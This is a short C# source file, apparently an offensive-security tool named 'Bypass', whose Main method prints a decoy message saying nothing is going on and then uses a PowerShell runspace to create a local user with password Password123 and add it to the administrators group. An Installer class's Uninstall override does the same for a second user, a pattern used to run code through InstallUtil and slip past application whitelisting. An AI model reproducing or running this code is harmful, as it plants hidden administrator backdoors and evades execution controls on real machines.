using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Nothing going on in this binary."); 
            Console.WriteLine("wow");          
            String cmd = "cmd.exe /c net user dagowda Password123 /add;cmd.exe /c net localgroup administrators dagowda /add";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "cmd.exe /c net user cool Password123 /add;cmd.exe /c net localgroup administrators cool /add";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
